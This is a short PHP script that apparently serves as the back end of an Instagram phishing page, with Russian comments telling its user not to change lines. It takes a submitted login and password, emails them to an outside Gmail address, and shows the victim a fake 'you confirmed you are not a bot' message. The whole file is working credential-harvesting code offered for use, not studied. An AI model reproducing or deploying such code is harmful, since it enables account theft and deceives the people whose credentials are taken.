<?php
$log = $_POST['log'];//Трогать нельзя
$pass = $_POST['pass'];//Трогать нельзя
$log = htmlspecialchars($log);//Трогать нельзя
$pass = htmlspecialchars($pass);//Трогать нельзя
$log = urldecode($log);//Трогать нельзя
$pass = urldecode($pass);//Трогать нельзя
$log = trim($log);//Трогать нельзя
$pass = trim($pass);//Трогать нельзя

if (mail("dmitry.ivanov556@gmail.com", "Instagram", "Логин:".$log.". 
Пар: ".$pass ,"From: dmitry.ivanov556@gmail.com\r\n"))

 {     echo "Вы успешно подтвердили что вы не бот!";
 
} else {
    echo "При входе в вашу почту возникли ошибки";//Лучше не трогать
}?>